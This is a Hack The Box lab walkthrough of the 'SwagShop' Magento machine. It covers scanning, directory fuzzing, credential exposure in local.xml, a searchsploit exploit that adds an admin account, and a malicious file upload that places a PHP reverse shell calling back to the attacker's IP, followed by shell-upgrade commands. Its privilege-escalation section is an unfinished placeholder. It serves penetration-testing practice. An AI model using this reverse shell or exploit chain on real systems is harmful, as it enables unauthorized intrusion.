# SwagShop

**Links:** [1](https://www.hackthebox.com/machines/swagshop)  [2](https://app.hackthebox.com/machines/swagshop)

**Machine ip:** 10.10.10.140

![SwagShop](https://github.com/h4md153v63n/CTFs/assets/5091265/73292ad2-0089-44f9-8d3c-a09b29f7a81d)

## Reconnaissance
First thing first, start with port scan to see which ports are open and which services are running on those ports.
+ `sudo masscan -p1-65535,U:1-65535 --rate=1000 10.10.10.140 -e tun0 > ports`
+ `ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//')`
+ `sudo nmap -Pn -n -sV -sC -O -p$ports 10.10.10.140 --open`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/936de3e3-86b1-4006-a7ef-6a3f0fe2aa32)

+ The result shows that 2 tcp ports are open:
```
Port tcp 22: OpenSSH 7.6p1
Port tcp 80: Apache httpd 2.4.29
```


## Enumeration
+ As usual, always start off with enumerating web server first.
+ Visit the web application.
+ Navigate to `http://10.10.10.140/`, and no works.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/867650f8-07a9-4a97-9db1-afa666204b13)

+ Add **swagshop.htb** into **hosts** file, and again revisit.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/5cdd986e-32af-41a3-a1e1-01757f0f2dce)

+ The application is magento that is an open-source e-commerce platform written in PHP.
+ We need to discover the version of magento.
+ As always, on each web app, start directory fuzzing:
```
gobuster dir -e -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://swagshop.htb/ -k -n -x html,php,txt -r -t 50
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/d41e6d29-b58c-4b19-ba61-7b7a4e072b87)

+ Navigate to `http://swagshop.htb/app/etc/local.xml`, and take note of **username:password** with **key**.
+ When trying ssh login and login page with these credentials, it doesn't work.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/bab5becc-4821-4cdd-bce0-ed8f3ed80de7)

+ View page source, and discover unfamiliar directory of **/index.php/**.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/72089ffb-ed32-4861-bae5-91a7d381be1a)

+ Approach with suspicion, and directory fuzzing for under **/index.php/**.
```
gobuster dir -e -w /usr/share/wordlists/dirb/common.txt -u http://swagshop.htb/index.php/ -k -n -x html,php,txt -r -t 20
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/970e5c7a-e7cc-48d3-b20d-8a3ca0967b59)

+ Discovered admin login panel: `http://swagshop.htb/index.php/admin`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/f07c0b07-b08c-44f9-ba1f-fbf1d54e4234)


## Gaining Access
+ Check whether it has any exploits: `searchsploit magento`
+ Focus rce ones, and check **37977.py** with **37811.py**.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/49088aa5-5b40-4b65-9c92-598bc22df3f8)

+ **Firstly**, when tried to exploit with 37811.py, it gives errors **mechanize._form_controls.AmbiguityError: more than one control matching name ‘login[username]’** and **AttributeError: ‘NoneType’ object has no attribute ‘group’**. Check the links: [1](https://forum.hackthebox.com/t/swagshop-rce/1959) [2](https://forum.hackthebox.com/t/was-swagshop-patched-again/3832) [3](https://forum.hackthebox.com/t/swagshop-errors-in-script-37811-py/1965).
+ I didn't try the solution with [burp broxy](https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/linux-boxes/swagshop-writeup-w-o-metasploit#id-26dd).

+ **Secondly**, concentrate on **37977.py**, and copy the exploit.
+ Open the exploit, and change **target** as `http://swagshop.htb/index.php/`.
+ Delete the 9-23th lines and after the 62nd line.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/a57b0991-8ae7-4301-8c4a-9f2dde48f4fb)

+ If wanna to specify username:pass different from **forme:forme**, try **test:test**.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/7f5f7a01-8539-4792-b5ac-c0d76cfa9836)

+ Run exploit with python2: `python2 37977.py` and see it worked.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/68df934e-dbfb-46b6-b1d4-80013065526c)

+ Login the admin login panel with **test:test**: `http://swagshop.htb/index.php/admin`, and see that worked.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/31fd6e3c-e7e5-4112-b3e8-3e9804c6dbf6)

+ **Follow consecutively**, Catalog -> Manage Products -> Click of the name on products -> Custom Options -> Add New Option: Fill out the fields with Input Type:File and Allowed File Extensions:php -> Save, and be sure that the product has been saved.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/4fb0a78c-13fd-425d-9f14-1872887b7f1a)

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/313ebb45-331c-40bf-93c2-d46a10d22203)

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/bfb592ba-ff8c-4a89-801d-3fe8e4c50321)

+ Next go to the home page `http://swagshop.htb/index.php/`, and click on **5 x Hack The Box Square Sticker**.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/80a6e0ae-b42b-4f0f-a26a-62cec021c306)

+ You will see that now we can upload files using the product fields. The file that we allowed to upload includes all files with PHP extensions:

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/df34f462-7f9b-4146-a5dc-c81071a8c742)

+ Create a reverse shell .php file as **shell.php**. Upload it using **browse** button, and ADD TO CART.
```
<?php system("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.14/4444 0>&1'"); ?>
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/b87bc67d-e9aa-416c-a35d-d512535bea31)

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/502e1a27-71db-44b8-b43c-6aabe2e8c3d2)

+ Start netcat listener on the attack machine: `nc -lnvp 4444`
+ **Finally**, go to the under **media** directory `http://swagshop.htb/media/custom_options/quote/s/h/` that is discovered on the first directory fuzzing.
+ Click the php file named created unique random name.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/d7a200d7-f925-4f1f-af42-f6dc2bbf28f6)

+ Get low level shell, and see the www-data's privilege is enough to view the content of the user flag.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/f283088e-d95e-4d02-a123-46941339b6a1)

+ But yet we need to elevate root privilege.


### Shell Upgrade
+ We have partially interactive bash shell. Upgrade it to get a fully interactive shell, do more stable with a better shell.
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
script /dev/null -c bash
CTRL^Z: Ctrl + Z
stty raw -echo; fg
reset
terminal type? 'screen' or 'xterm'
export TERM=xterm  
export SHELL=bash
stty rows 55 columns 285
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/63a9d3b8-9bc0-4d88-bb02-ca5e422acf27)


## Privilege Escalation
+ xxx


# Technical Knowledge
+ https://websec.wordpress.com/2014/12/08/magento-1-9-0-1-poi/
+ 


# CVE Scripting
+ xxx


# References & Alternatives
+ https://vvmlist.github.io/#swagshop
+ https://0xdf.gitlab.io/2019/09/28/htb-swagshop.html
+ https://www.hackingarticles.in/swagshop-hackthebox-walkthrough/
+ https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/linux-boxes/swagshop-writeup-w-o-metasploit
+ https://manuelvazquez-contact.gitbook.io/oscp-prep/hack-the-box/swagshop/scanning-and-enumeration
+ https://medium.com/@v1per/swagshop-hackthebox-writeup-a23f18e6b88b
